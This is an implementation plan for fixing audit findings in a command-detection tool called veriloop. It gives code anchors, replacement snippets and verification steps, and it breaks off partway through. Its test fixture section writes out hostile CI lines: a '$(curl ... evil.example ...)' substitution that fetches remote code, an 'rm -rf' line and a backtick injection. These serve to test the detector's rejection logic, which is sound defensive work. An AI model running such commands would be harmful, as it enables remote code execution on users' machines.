# veriloop v0.1.1 — audit-fix plan (executable, no-assistance)

**Context.** Two independent adversarial audits of veriloop v0.1 found 7 MAJOR and ~12
MINOR/NIT issues. This plan fixes every one (or explicitly records it as an accepted
tradeoff at the bottom). It is written so an implementer can execute it **mechanically,
without asking questions**: every step has (a) the file, (b) an exact ANCHOR — a unique
snippet of the current code to locate/replace, (c) the exact change, and (d) a
VERIFY command with its expected outcome. If an anchor does not match exactly,
re-read the file — the anchor text is authoritative over any line numbers.

**Repo:** `/Users/benjaminli/my_projects/veriloop` (call it `$V`).
**Scratch:** `/private/tmp/claude-501/-Users-benjaminli-my-projects/476843bf-8cc4-42aa-8e82-65478cfdafa5/scratchpad` (call it `$S`).
**Test targets (READ/scan only; never edit, never run their test/build/e2e):**
`/Users/benjaminli/my_projects/Torevan` and `/Users/benjaminli/my_projects/catan_rl_v2`.

## Ground rules for the implementer

1. **Surgical edits only.** Touch only the files your workstream names. Do not
   reformat, rename, or "improve" adjacent code. Match existing style.
2. **Verify after every step** with the step's VERIFY command. Do not batch
   verification to the end. If a VERIFY fails, fix your change until it passes —
   do not proceed with a failing step.
3. **Never run side-effecting commands on the two real repos.** On them you may
   only run: `node $V/scripts/detect.mjs …`, `node $V/scripts/verify.mjs` **without
   any `--include`** (safe-tier only), `node $V/scripts/generate.mjs --out $S/…`,
   `node $V/scripts/lint-bundle.mjs`, and read-only git/file commands. `--include`
   flags are exercised ONLY against the synthesized fixture commands.json (step C4).
4. **Never execute anything from `fixtures/hostile-ci/`.** It exists to be *scanned*
   by detect.mjs, never verified/run.
5. All outputs (regenerated commands.json, bundles) go to `$S`, never into the two
   real repos.
6. Use `node --check <file>` after editing any `.mjs` file (they must stay valid).
7. If you must deviate from this plan, append a terse `## Implementation notes`
   section at the bottom of this file saying what and why.

---

# Workstream A — detection layer

Files: `scripts/lib/detectors.mjs`, `scripts/lib/toml.mjs`, `scripts/lib/makefile.mjs`,
`scripts/lib/ci.mjs`, `scripts/detect.mjs`, `scripts/verify.mjs`, plus NEW
`fixtures/**` and NEW `scripts/selftest.mjs`.

### A1 (MAJOR, security) — close the `$()`/backtick hole; sanitize step-3 CI adoption

**File:** `scripts/lib/detectors.mjs`

(1) ANCHOR (in `isCleanInvocation`):
```js
  const c = cmd.trim();
  if (/[|&;<>]|\bcd\b|\bexport\b/.test(c)) return false; // compound shell / redirects
  if (/^\s*\w+=\S/.test(c)) return false; // leading VAR=val env prefix
```
REPLACE WITH:
```js
  const c = cmd.trim();
  if (/[|&;<>]|\bcd\b|\bexport\b/.test(c)) return false; // compound shell / redirects
  if (/[$`]/.test(c)) return false; // command substitution / env expansion / backticks
  if (/\n/.test(cmd)) return false; // multi-line
  if (/^\s*\w+=\S/.test(c)) return false; // leading VAR=val env prefix
```

(2) ANCHOR (step 3 of `reconcile`):
```js
    // 3. else adopt a CI-only command (ground truth) for the category
    if (!chosen && ciMatches.length) {
      const c = ciMatches[0];
      chosen = { cmd: c.cmd, source: `${c.file}:${c.line} (CI)`, from: 'ci' };
      verified_by_ci = true;
    }
```
REPLACE WITH:
```js
    // 3. else adopt a CI-only command (ground truth) — but ONLY a clean,
    //    reproducible entrypoint. Never adopt compound/substituting shell from a
    //    workflow file: adopted commands can end up auto-run by verify.mjs.
    if (!chosen && ciMatches.length) {
      const c = ciMatches.find((x) => isCleanInvocation(x.cmd));
      if (c) {
        chosen = { cmd: c.cmd, source: `${c.file}:${c.line} (CI)`, from: 'ci' };
        verified_by_ci = true;
      }
    }
```

VERIFY (section C's fixtures re-verify this via selftest; for now):
`node --check $V/scripts/lib/detectors.mjs` → exit 0. Then
`node $V/scripts/detect.mjs --repo /Users/benjaminli/my_projects/catan_rl_v2 --print 2>/dev/null | grep -c 'make test-unit'`
→ prints `1` or more (the legitimate clean CI adoption still works).

### A2 (MAJOR) — fix `test_single` for scoped monorepos (`-w` is vitest's watch flag, not a workspace flag)

**File:** `scripts/lib/detectors.mjs`

ANCHOR:
```js
  const testName = pickScript(scripts, SCRIPT_ALIASES.test);
  let tr = testName ? testRunnerOf(scripts[testName]) : null;
  let trScope = null;
  if (!tr) {
    const s = scopePkgs.find(({ wpkg }) => {
      const tn = pickScript(wpkg.scripts || {}, SCRIPT_ALIASES.test);
      return tn && testRunnerOf(wpkg.scripts[tn]);
    });
    if (s) {
      trScope = s.wpkg.name;
      tr = testRunnerOf(s.wpkg.scripts[pickScript(s.wpkg.scripts, SCRIPT_ALIASES.test)]);
    }
  }
  const wArg = trScope ? ` -w ${trScope}` : '';
  if (tr === 'vitest') addCandidate(out, 'test_single', { cmd: `npx vitest run <file>${wArg}`, source: 'test runner: vitest', from: 'node' });
  else if (tr === 'jest') addCandidate(out, 'test_single', { cmd: `npx jest <file>${wArg}`, source: 'test runner: jest', from: 'node' });
  else if (tr === 'mocha') addCandidate(out, 'test_single', { cmd: `npx mocha <file>${wArg}`, source: 'test runner: mocha', from: 'node' });
  else if (testName) addCandidate(out, 'test_single', { cmd: `${runner} ${testName} -- <file>`, source: cite(testName), from: 'node' });
```
REPLACE WITH:
```js
  // test_single — from the root test runner, else a scope's test runner. For a
  // scoped runner, `cd` into the workspace dir: `npx vitest run X -w pkg` is WRONG
  // (-w is vitest's --watch, jest's --maxWorkers — not a workspace selector).
  const testName = pickScript(scripts, SCRIPT_ALIASES.test);
  let tr = testName ? testRunnerOf(scripts[testName]) : null;
  let trDir = null;
  if (!tr) {
    const s = scopePkgs.find(({ wpkg }) => {
      const tn = pickScript(wpkg.scripts || {}, SCRIPT_ALIASES.test);
      return tn && testRunnerOf(wpkg.scripts[tn]);
    });
    if (s) {
      trDir = s.dir;
      tr = testRunnerOf(s.wpkg.scripts[pickScript(s.wpkg.scripts, SCRIPT_ALIASES.test)]);
    }
  }
  const single = (bare) => (trDir ? `(cd ${trDir} && ${bare})` : bare);
  if (tr === 'vitest') addCandidate(out, 'test_single', { cmd: single('npx vitest run <file>'), source: 'test runner: vitest', from: 'node' });
  else if (tr === 'jest') addCandidate(out, 'test_single', { cmd: single('npx jest <file>'), source: 'test runner: jest', from: 'node' });
  else if (tr === 'mocha') addCandidate(out, 'test_single', { cmd: single('npx mocha <file>'), source: 'test runner: mocha', from: 'node' });
  else if (testName) addCandidate(out, 'test_single', { cmd: `${runner} ${testName} -- <file>`, source: cite(testName), from: 'node' });
```

VERIFY:
`node $V/scripts/detect.mjs --repo /Users/benjaminli/my_projects/Torevan --print 2>/dev/null | grep 'vitest run'`
→ contains `(cd apps/web && npx vitest run <file>)` and does NOT contain `-w @torevan/web` on the vitest line.

### A3 (MAJOR) — package-manager-correct workspace commands (pnpm/yarn/bun)

**File:** `scripts/lib/detectors.mjs`

(1) Add this helper directly AFTER the existing `nodeRunner` function:
```js
/** PM-correct "run script X in workspace pkg" invocation. npm's -w flag is npm-only. */
function scopeRun(pm, script, pkgName, dir) {
  if (pkgName) {
    if (pm === 'npm') return `npm run ${script} -w ${pkgName}`;
    if (pm === 'pnpm') return `pnpm --filter ${pkgName} run ${script}`;
    if (pm === 'yarn') return `yarn workspace ${pkgName} run ${script}`;
  }
  return `(cd ${dir} && ${nodeRunner(pm)} ${script})`; // bun + nameless fallback
}
```

(2) ANCHOR (scope command construction):
```js
    for (const cat of ['typecheck', 'lint', 'format', 'test', 'build', 'dev', 'e2e']) {
      const n = pickScript(wscripts, SCRIPT_ALIASES[cat]);
      if (n) scopeCmds[cat] = wpkg.name ? `${runner} ${n} -w ${wpkg.name}` : `(cd ${dir} && ${runner} ${n})`;
    }
```
REPLACE WITH:
```js
    for (const cat of ['typecheck', 'lint', 'format', 'test', 'build', 'dev', 'e2e']) {
      const n = pickScript(wscripts, SCRIPT_ALIASES[cat]);
      if (n) scopeCmds[cat] = scopeRun(pm, n, wpkg.name, dir);
    }
```

(3) ANCHOR (e2e promotion):
```js
    const s = scopePkgs.find(({ wpkg }) => pickScript(wpkg.scripts || {}, SCRIPT_ALIASES.e2e));
    if (s) {
      const n = pickScript(s.wpkg.scripts, SCRIPT_ALIASES.e2e);
      addCandidate(out, 'e2e', { cmd: `${runner} ${n} -w ${s.wpkg.name}`, source: sourceRef(root, join(root, s.dir, 'package.json'), null), from: 'node-scope' });
    }
```
REPLACE WITH:
```js
    const s = scopePkgs.find(({ wpkg }) => pickScript(wpkg.scripts || {}, SCRIPT_ALIASES.e2e));
    if (s) {
      const n = pickScript(s.wpkg.scripts, SCRIPT_ALIASES.e2e);
      addCandidate(out, 'e2e', { cmd: scopeRun(pm, n, s.wpkg.name, s.dir), source: sourceRef(root, join(root, s.dir, 'package.json'), null), from: 'node-scope' });
    }
```

VERIFY: Torevan detect output unchanged for npm:
`node $V/scripts/detect.mjs --repo /Users/benjaminli/my_projects/Torevan --print 2>/dev/null | grep '"e2e"' -A 2 | grep 'npm run test:e2e -w @torevan/web'` → 1 line.
(pnpm form is asserted by the selftest fixture in C.)

### A4 (MAJOR) — read `pnpm-workspace.yaml`; expand `**` and nested `*` globs; warn on dead patterns

**File:** `scripts/lib/detectors.mjs`

(1) Add AFTER the `scopeRun` helper from A3:
```js
/** Minimal pnpm-workspace.yaml reader: the `packages:` list only. */
function readPnpmWorkspace(root) {
  const text = readText(join(root, 'pnpm-workspace.yaml'));
  if (!text) return null;
  const out = [];
  let inPkgs = false;
  for (const raw of text.split('\n')) {
    const line = raw.replace(/#.*$/, '');
    if (/^packages\s*:/.test(line)) { inPkgs = true; continue; }
    if (inPkgs) {
      const m = line.match(/^\s+-\s*['"]?([^'"\s]+)['"]?\s*$/);
      if (m) out.push(m[1]);
      else if (line.trim() && !line.startsWith(' ')) inPkgs = false; // dedent = section over
    }
  }
  return out.length ? out : null;
}
```

(2) REPLACE the whole existing `expandWorkspaces` function (ANCHOR: its current body
handles only `p.endsWith('/*')` and a literal-dir fallback) WITH:
```js
/** Expand workspace globs: literal dirs, `*`, nested `a/*/*`, and `**` (depth<=3). */
function expandWorkspaces(root, patterns, warnings) {
  const dirs = new Set();
  const walkSeg = (rel, segs, i) => {
    if (i === segs.length) {
      if (rel && isDir(join(root, rel))) dirs.add(rel);
      return;
    }
    const seg = segs[i];
    const base = rel ? join(root, rel) : root;
    if (seg === '**') {
      walkSeg(rel, segs, i + 1); // zero dirs
      for (const name of listDir(base)) {
        if (name === 'node_modules' || name.startsWith('.')) continue;
        const next = rel ? `${rel}/${name}` : name;
        if (isDir(join(root, next)) && next.split('/').length <= 3) walkSeg(next, segs, i);
      }
    } else if (seg === '*') {
      for (const name of listDir(base)) {
        if (name === 'node_modules' || name.startsWith('.')) continue;
        const next = rel ? `${rel}/${name}` : name;
        if (isDir(join(root, next))) walkSeg(next, segs, i + 1);
      }
    } else {
      walkSeg(rel ? `${rel}/${seg}` : seg, segs, i + 1);
    }
  };
  for (const p of patterns || []) {
    if (p.startsWith('!')) continue; // negation patterns: not needed for scope discovery
    const before = dirs.size;
    walkSeg('', p.split('/').filter(Boolean), 0);
    if (dirs.size === before && warnings) warnings.push(`workspace pattern matched nothing: ${p}`);
  }
  return [...dirs];
}
```

(3) ANCHOR (workspace pattern read in `detectNode`):
```js
  const wsPatterns = Array.isArray(pkg.workspaces) ? pkg.workspaces : pkg.workspaces?.packages;
```
REPLACE WITH:
```js
  let wsPatterns = Array.isArray(pkg.workspaces) ? pkg.workspaces : pkg.workspaces?.packages;
  if (!wsPatterns && pm === 'pnpm') wsPatterns = readPnpmWorkspace(root); // pnpm declares workspaces in YAML
```
And on the next line where `expandWorkspaces(root, wsPatterns)` is called, change the
call to `expandWorkspaces(root, wsPatterns, out.warnings)`.

(4) In `detectCommands` (the `out` literal at the bottom of the file), add
`warnings: [],` directly after `has_ui: false,`.

(5) **File `scripts/detect.mjs`** — in `summary()`, after the `scopes` block, add:
```js
  if (cj.warnings && cj.warnings.length) {
    lines.push('  warnings:');
    for (const w of cj.warnings) lines.push(`    ⚠ ${w}`);
  }
```

VERIFY: `node --check` both files → exit 0;
`node $V/scripts/detect.mjs --repo /Users/benjaminli/my_projects/Torevan --print 2>/dev/null | grep -c '"@torevan/web"'` → ≥1 (npm workspaces still expand). pnpm behavior is asserted by fixture in C.

### A5 (MAJOR) — stop calling headless backends "UI"

**File:** `scripts/lib/detectors.mjs`

(1) ANCHOR:
```js
const PY_UI_SIGNALS = ['streamlit', 'gradio', 'dash', 'django', 'flask', 'reflex', 'fastapi'];
```
REPLACE WITH:
```js
// Only frameworks whose PRESENCE implies a browser UI. Server frameworks
// (fastapi/flask/django) are deliberately excluded — an API-only backend must not
// get a screenshot gate. veriloop's LLM deep-scan phase may flip has_ui manually
// when a server app really renders templates.
const PY_UI_SIGNALS = ['streamlit', 'gradio', 'dash', 'reflex', 'nicegui', 'panel'];
```

(2) ANCHOR (dep matching in `detectPython`):
```js
  const deps = [...(toml.project?.dependencies || []), ...Object.values(optDeps).flat()].map((d) => norm(String(d)));
  if (deps.some((d) => PY_UI_SIGNALS.some((sig) => d.startsWith(sig)))) out.has_ui = true;
```
REPLACE WITH:
```js
  const deps = [...(toml.project?.dependencies || []), ...Object.values(optDeps).flat()].map((d) => norm(String(d)));
  const depBase = (d) => d.split(/[\s\[<>=!~;(]/)[0]; // exact package name, not startsWith
  if (deps.some((d) => PY_UI_SIGNALS.includes(depBase(d)))) out.has_ui = true;
```

(3) ANCHOR:
```js
const E2E_DEP_SIGNALS = ['@playwright/test', 'playwright', 'cypress', '@testing-library/react'];
```
REPLACE WITH (jsdom unit-test lib is not an e2e/UI-gate signal):
```js
const E2E_DEP_SIGNALS = ['@playwright/test', 'playwright', 'cypress'];
```

VERIFY: `node $V/scripts/detect.mjs --repo /Users/benjaminli/my_projects/catan_rl_v2 --print 2>/dev/null | grep '"has_ui"'` → `"has_ui": false,`; same for Torevan → `true` (it has `next`/playwright). FastAPI case asserted by fixture in C.

### A6 (MAJOR) — clear stale verify fields on skip

**File:** `scripts/verify.mjs`

ANCHOR:
```js
    if (!p.run) {
      c.verified = c.verified ?? null;
      c.verify_skipped = p.reason;
```
REPLACE WITH:
```js
    if (!p.run) {
      // A skipped command has NO current verification: reset all run artifacts so
      // the record can never simultaneously claim "skipped" and "verified pass".
      c.verified = null;
      delete c.verify_exit;
      delete c.verify_ms;
      delete c.verify_tail;
      c.verify_skipped = p.reason;
```
Also add a comment near the top usage block of the file: `// NOTE: run verify ONCE with your full --include set — a later narrower run resets the skipped commands' verification.`

VERIFY: covered mechanically by selftest C4. Interim: `node --check $V/scripts/verify.mjs` → exit 0.

### A7 (MINOR) — keep e2e/integration commands out of the `test` category

**File:** `scripts/lib/detectors.mjs`

ANCHOR (in `reconcile`):
```js
    const ciMatches = ciCmds.filter((c) => matchesCategory(c.cmd, category));
```
REPLACE WITH:
```js
    let ciMatches = ciCmds.filter((c) => matchesCategory(c.cmd, category));
    // an integration/e2e run-line must never fill the plain `test` slot
    if (category === 'test') ciMatches = ciMatches.filter((c) => !matchesCategory(c.cmd, 'e2e'));
```

VERIFY: `node $V/scripts/detect.mjs --repo /Users/benjaminli/my_projects/catan_rl_v2 --print 2>/dev/null | grep -A1 '"test"' | grep 'make test-unit'` → still `make test-unit` (not the integration pytest line).

### A8 (MINOR) — TOML: triple-quoted strings + escaped quotes

**File:** `scripts/lib/toml.mjs`

(1) In `stripComment`, ANCHOR:
```js
    if (inS) {
      if (c === q) inS = false;
    } else if (c === '"' || c === "'") {
```
REPLACE WITH:
```js
    if (inS) {
      if (c === '\\' && q === '"') { i++; continue; } // skip escaped char in basic strings
      if (c === q) inS = false;
    } else if (c === '"' || c === "'") {
```

(2) In `parseToml`, immediately AFTER the line `let valRaw = line.slice(eq + 1).trim();`
insert:
```js
    // multi-line """...""" / '''...''' strings: consume through the closing delimiter
    const tq = valRaw.startsWith('"""') ? '"""' : valRaw.startsWith("'''") ? "'''" : null;
    if (tq) {
      let body = valRaw.slice(3);
      while (!body.includes(tq) && i + 1 < rawLines.length) {
        i++;
        body += '\n' + rawLines[i];
      }
      const endIdx = body.indexOf(tq);
      const keysT = dottedKeys(key);
      const targetT = keysT.length > 1 ? ensurePath(cur, keysT.slice(0, -1)) : cur;
      targetT[keysT[keysT.length - 1]] = endIdx === -1 ? body : body.slice(0, endIdx);
      continue;
    }
```

VERIFY:
`node -e "import('$V/scripts/lib/toml.mjs').then(m=>{const t=m.parseToml('[project]\ndescription = \"\"\"multi\nline\"\"\"\nname = \"x\"\n[tool.ruff]\nline-length = 100');console.log(t.project.name, t.tool.ruff['line-length']);})"`
→ prints `x 100` (the table after the multi-line string still parses).

### A9 (MINOR) — Makefile: `+=`/`::=` vars; multi-target rule lines

**File:** `scripts/lib/makefile.mjs`

(1) ANCHOR:
```js
    const m = raw.match(/^([A-Za-z_][A-Za-z0-9_]*)\s*[:?]?=\s*(.*)$/);
    if (m && !raw.startsWith('\t')) {
      result.vars[m[1]] = m[2].trim();
    }
```
REPLACE WITH:
```js
    const m = raw.match(/^([A-Za-z_][A-Za-z0-9_]*)\s*(\+=|\?=|::?=|=)\s*(.*)$/);
    if (m && !raw.startsWith('\t')) {
      if (m[2] === '+=') result.vars[m[1]] = ((result.vars[m[1]] || '') + ' ' + m[3].trim()).trim();
      else result.vars[m[1]] = m[3].trim();
    }
```

(2) ANCHOR (target registration):
```js
    const t = raw.match(/^([A-Za-z0-9_][A-Za-z0-9_.\-/]*)\s*:(?!=)/);
    if (t) {
      const name = t[1];
      // skip special/pattern targets
      if (name.startsWith('.') || name.includes('%')) {
        current = null;
        continue;
      }
      current = { line: i + 1, recipe: [] };
      // .PHONY etc. already excluded; first definition wins
      if (!(name in result.targets)) result.targets[name] = current;
      else current = result.targets[name];
      continue;
    }
```
REPLACE WITH:
```js
    const t = raw.match(/^([A-Za-z0-9_][A-Za-z0-9_.\-/ ]*)\s*:(?!=)/);
    if (t) {
      // a rule line may name several targets: `lint typecheck: deps`
      const names = t[1].trim().split(/\s+/).filter((n) => !n.startsWith('.') && !n.includes('%'));
      if (!names.length) {
        current = null;
        continue;
      }
      current = { line: i + 1, recipe: [] };
      for (const name of names) {
        if (!(name in result.targets)) result.targets[name] = current; // first definition wins
      }
      current = result.targets[names[0]];
      continue;
    }
```

VERIFY:
`node -e "import('$V/scripts/lib/makefile.mjs').then(m=>{const r=m.parseMakefile('CFLAGS = -a\nCFLAGS += -b\nlint typecheck: deps\n\truff check src\n');console.log(r.vars.CFLAGS, r.targets.lint.recipe[0], r.targets.typecheck.recipe[0]);})"`
→ prints `-a -b ruff check src ruff check src`.
Then re-run catan detect → `make typecheck` / `make lint` citations unchanged.

### A10 (MINOR) — CI: join `\` line continuations in block scalars

**File:** `scripts/lib/ci.mjs`

ANCHOR (inside the block-scalar branch of `scanRunSteps`):
```js
      for (let j = i + 1; j < lines.length; j++) {
        const bl = lines[j];
        if (bl.trim() === '') continue;
        const blIndent = bl.length - bl.trimStart().length;
        if (blIndent <= indent) break;
        pushCmd(out, bl.trim(), relFile, j + 1);
      }
```
REPLACE WITH:
```js
      let carry = '';
      let carryLine = 0;
      for (let j = i + 1; j < lines.length; j++) {
        const bl = lines[j];
        if (bl.trim() === '') continue;
        const blIndent = bl.length - bl.trimStart().length;
        if (blIndent <= indent) break;
        let text = bl.trim();
        if (carry) { text = carry + ' ' + text; }
        if (text.endsWith('\\')) { // shell line continuation — join with the next line
          carry = text.slice(0, -1).trim();
          if (!carryLine) carryLine = j + 1;
          continue;
        }
        pushCmd(out, text, relFile, carryLine || j + 1);
        carry = '';
        carryLine = 0;
      }
      if (carry) pushCmd(out, carry, relFile, carryLine);
```

VERIFY:
`node -e "import('$V/scripts/lib/ci.mjs').then(()=>console.log('ok'))"` → ok; asserted properly by fixture C (hostile-ci uses a continuation).

### A11 (MINOR) — CLI arg validation; timeout NaN

**Files:** `scripts/detect.mjs` and `scripts/verify.mjs`

In BOTH files add this helper above `parseArgs`:
```js
function reqVal(argv, i, flag) {
  const v = argv[i];
  if (v === undefined || v.startsWith('--')) {
    console.error(`missing value for ${flag}`);
    process.exit(2);
  }
  return v;
}
```
Then in each `parseArgs`, wrap every `argv[++i]` value read as `reqVal(argv, ++i, '<flag>')`
(e.g. `args.repo = resolve(reqVal(argv, ++i, '--repo'))`). In `verify.mjs` additionally,
after parsing, ANCHOR `else if (a === '--timeout') args.timeout = parseInt(argv[++i], 10);`
→ use `reqVal`, and at the end of `parseArgs` before `return args;` add:
```js
  if (!Number.isFinite(args.timeout) || args.timeout <= 0) args.timeout = 180;
```

VERIFY: `node $V/scripts/detect.mjs --repo` → prints `missing value for --repo`, exit 2.
`node $V/scripts/verify.mjs --repo . --commands` → same pattern.

### A12 (MINOR) — strip ANSI from stored failure tails

**File:** `scripts/verify.mjs`

ANCHOR:
```js
  const out = `${res.stdout || ''}${res.stderr || ''}`;
  const tail = out.split('\n').slice(-20).join('\n').slice(-2000);
```
REPLACE WITH:
```js
  const out = `${res.stdout || ''}${res.stderr || ''}`.replace(/\u001b\[[0-9;]*[A-Za-z]/g, '');
  const tail = out.split('\n').slice(-20).join('\n').slice(-2000);
```
Also, on the `spawnSync` options ANCHOR `maxBuffer: 64 * 1024 * 1024,` add after it a line
`killSignal: 'SIGKILL',` (timeouts must actually kill the shell).
Also add above the `env:` line this comment:
```js
    // CI=1 makes watch-style tools exit, but some toolchains treat CI as
    // warnings-as-errors — a local-green command may verify red. Tradeoff: we
    // prefer deterministic termination; the tail records the real output.
```

VERIFY: re-run safe verify on catan into a fresh commands.json copy in `$S` and check no ESC (\x1b) byte in the file: `node $V/scripts/detect.mjs --repo /Users/benjaminli/my_projects/catan_rl_v2 --out $S/catan-commands.json && node $V/scripts/verify.mjs --repo /Users/benjaminli/my_projects/catan_rl_v2 --commands $S/catan-commands.json ; grep -c $'\x1b' $S/catan-commands.json || true` → `0`.
\x1b' $S/catan-commands.json` → `0`.

### A13 (NITs) — small correctness touches

**File:** `scripts/lib/detectors.mjs`
1. ANCHOR `install: ['install', 'ci', 'sync'],` (in `TOOL_FAMILIES`) → REPLACE `'ci'` with `'npm ci'`.
2. Script citation precision: in `detectNode`, ANCHOR:
```js
  const cite = (name) => sourceRef(root, pkgPath, findLine(pkgText, `"${name}"`));
```
REPLACE WITH (search only within/after the `"scripts"` block so a same-named dep can't steal the citation):
```js
  const scriptsAt = findLine(pkgText, '"scripts"') || 1;
  const cite = (name) => {
    const lines = (pkgText || '').split('\n');
    for (let ln = scriptsAt; ln < lines.length; ln++) {
      if (lines[ln - 1].includes(`"${name}"`)) return sourceRef(root, pkgPath, ln);
    }
    return sourceRef(root, pkgPath, findLine(pkgText, `"${name}"`));
  };
```

VERIFY: Torevan detect → typecheck citation is still `package.json:19` (scripts block), lint `package.json:18`.

### C — fixtures + selftest (NEW files; the mechanical proof)

Create these EXACT files:

**`fixtures/pnpm-mono/package.json`**
```json
{ "name": "fix-pnpm-mono", "private": true }
```
**`fixtures/pnpm-mono/pnpm-lock.yaml`**
```yaml
lockfileVersion: '9.0'
```
**`fixtures/pnpm-mono/pnpm-workspace.yaml`**
```yaml
packages:
  - 'packages/*'
```
**`fixtures/pnpm-mono/packages/app/package.json`**
```json
{
  "name": "@fix/app",
  "scripts": { "test": "vitest run", "lint": "eslint ." },
  "devDependencies": { "react": "18.0.0", "vitest": "1.0.0" }
}
```

**`fixtures/fastapi-api/pyproject.toml`**
```toml
[project]
name = "fix-api"
version = "0.1.0"
dependencies = ["fastapi>=0.100", "uvicorn>=0.20"]

[tool.ruff]
line-length = 100
```
**`fixtures/fastapi-api/tests/.gitkeep`** (empty file)

**`fixtures/hostile-ci/.github/workflows/ci.yml`**
```yaml
name: CI
on: [push]
jobs:
  evil:
    runs-on: ubuntu-latest
    steps:
      - run: mypy $(curl -s http://evil.example/x.sh)
      - run: |
          tsc -p . && rm -rf /tmp/pwned
          eslint . \
            --max-warnings 0 `cat /tmp/inject`
```

**`scripts/selftest.mjs`** — write a script with this exact behavior (structure it
however is cleanest; keep it dependency-free):
1. Imports `detectCommands` from `./lib/detectors.mjs`; resolves fixture paths
   relative to its own file (`fileURLToPath(import.meta.url)`).
2. `pnpm-mono` assertions:
   - `package_manager === 'pnpm'`
   - `scopes.length === 1` and `scopes[0].commands.lint === 'pnpm --filter @fix/app run lint'`
   - `has_ui === true` (react dep in the leaf workspace)
   - `commands.test_single.cmd === '(cd packages/app && npx vitest run <file>)'`
3. `fastapi-api` assertions:
   - `has_ui === false`
   - `commands.lint.cmd.startsWith('ruff check')`
4. `hostile-ci` assertions (detect ONLY — never execute anything from this fixture):
   - `commands.typecheck === undefined` (both typecheck-shaped CI lines are unclean: `$()` and `&&`)
   - `commands.lint === undefined` (the joined eslint line contains a backtick → rejected)
   - no command value anywhere in `commands` contains `$(` or a backtick
   - at least one `ci_commands` entry contains `--max-warnings 0` (proves A10 joined the
     `eslint . \` continuation into one line), and no entry is `\` or ends with `\`
5. verify.mjs behavior test (synthesized — no fixture repo command is executed except
   `node -e` one-liners): create a temp dir under `os.tmpdir()`; write a commands.json:
   ```json
   { "veriloop_schema": 1, "repo_root": ".", "commands": {
       "test": { "cmd": "node -e \"process.exit(0)\"", "cwd": ".", "source": "selftest", "from": "node", "safety": "ask", "verified_by_ci": false, "verified": null },
       "lint": { "cmd": "node -e \"console.error('x'); process.exit(1)\"", "cwd": ".", "source": "selftest", "from": "node", "safety": "safe", "verified_by_ci": false, "verified": null } } }
   ```
   Run `scripts/verify.mjs` via `spawnSync(process.execPath, [verifyPath, '--repo', tmp, '--commands', cjPath, '--include', 'test'])`.
   Assert: `test.verified === true` with numeric `verify_exit === 0`; `lint.verified === false` with `verify_tail` present and containing no ESC (\x1b) byte.
   Run verify AGAIN without `--include`. Assert: `test.verified === null`, `'verify_exit' in test === false`, `test.verify_skipped` present; `lint.verified === false` still.
6. Print one line per assertion (`ok - <desc>` / `FAIL - <desc>`), a final count, and
   `process.exit(1)` if any failed.

VERIFY: `node $V/scripts/selftest.mjs` → all assertions `ok`, exit 0.

---

# Workstream B — generation layer + docs

Files: `scripts/templates/dev-loop.template.js`, `scripts/generate.mjs`,
`scripts/lib/render.mjs`, `scripts/lint-bundle.mjs`, `skills/veriloop/SKILL.md`, `README.md`.
Do NOT touch Workstream A's files.

### B1 (MAJOR) — real interview plumbing + `extraChecks` (restores the lost advisor-gate capability)

**File: `scripts/generate.mjs`**

(1) In `parseArgs`, add flag parsing for `--interview <file>` (pattern-match the
existing flags; store `args.interview = resolve(argv[++i])`, default `null`).

(2) In `main()`, ANCHOR:
```js
  const roster = detectRoster(args.repo, cj);
  const config = buildConfig(cj, roster, repoName);
```
REPLACE WITH:
```js
  const roster = detectRoster(args.repo, cj);
  // interview answers: prior manifest's answers survive a re-run; a --interview
  // file merges over them. They are USER data — never silently reset.
  let interview = {};
  const priorManifestPath = join(args.out, '.claude/veriloop/veriloop-manifest.json');
  if (existsSync(priorManifestPath)) {
    try { interview = JSON.parse(readFileSync(priorManifestPath, 'utf8')).interview_answers || {}; } catch { /* ignore */ }
  }
  if (args.interview) interview = { ...interview, ...JSON.parse(readFileSync(args.interview, 'utf8')) };
  const config = buildConfig(cj, roster, repoName, interview);
```

(3) Change `function buildConfig(cj, roster, repoName) {` →
`function buildConfig(cj, roster, repoName, interview = {}) {`, and inside it:
- ANCHOR `crossModel: true,` → REPLACE `crossModel: interview.cross_model !== undefined ? !!interview.cross_model : true,`
- ANCHOR `riskTiers: buildRiskTiers(cj, roster),` → REPLACE:
```js
    riskTiers: (() => {
      const rt = buildRiskTiers(cj, roster);
      for (const k of interview.high_risk_areas || []) if (!rt.high.includes(k)) rt.high.push(k);
      return rt;
    })(),
```
- After the `e2e:` property, add:
```js
    extraChecks: (interview.extra_checks || []).map((x) => ({
      name: String(x.name),
      instruction: String(x.instruction),
      areaKeywords: Array.isArray(x.areaKeywords) ? x.areaKeywords.map(String) : [],
    })),
```

(4) ANCHOR `interview_answers: {},` (manifest literal) → REPLACE `interview_answers: interview,`.

(5) In the manifest `roster:` mapping, ANCHOR
`roster: roster.experts.map((e) => ({ key: e.key, title: e.title, tiers: e.tiers, evidence: e.evidence })),`
→ REPLACE WITH:
```js
    roster: roster.experts.map((e) => ({ key: e.key, title: e.title, tiers: e.tiers, evidence: e.evidence, file: `.claude/veriloop/experts/${expertSlug(e.key)}.md` })),
```
(This also enables the B7 lint check.)

**File: `scripts/templates/dev-loop.template.js`**

(6) In `runChecks`, ANCHOR:
```js
  const list = VERILOOP.gate
    .map((c) => `- \`${c.cmd}\`  → report as check "${c.name}", result strictly from the process EXIT CODE (0=pass, nonzero=fail)`)
    .join('\n');
```
REPLACE WITH:
```js
  let list = VERILOOP.gate
    .map((c) => `- \`${c.cmd}\`  → report as check "${c.name}", result strictly from the process EXIT CODE (0=pass, nonzero=fail)`)
    .join('\n');
  // repo-specific extra gate checks (e.g. a DB security advisor) — from the interview
  for (const x of VERILOOP.extraChecks || []) {
    if (!x.areaKeywords.length || matchAny(ctx.touched, x.areaKeywords)) {
      list += `\n- ${x.instruction}  → report as check "${x.name}" (result pass/fail)`;
    }
  }
```
(`matchAny` is a hoisted function declaration in the template, so it is available.)

**Docs (same step):** in `skills/veriloop/SKILL.md` Phase 5, replace the current wording
with: answers are written to `$REPO/.claude/veriloop/interview.json` and passed via
`node … generate.mjs --interview "$REPO/.claude/veriloop/interview.json"`; document the schema
`{ cross_model?: bool, high_risk_areas?: string[], extra_checks?: [{name, instruction, areaKeywords?}] }`;
state that answers persist in the manifest across re-runs and merge, never reset. Add the
Torevan Supabase-advisor `extra_checks` entry as the worked example.

VERIFY:
```bash
cat > $S/interview-sample.json <<'EOF'
{ "cross_model": false, "high_risk_areas": ["matchmaking"],
  "extra_checks": [{ "name": "supabase-advisor",
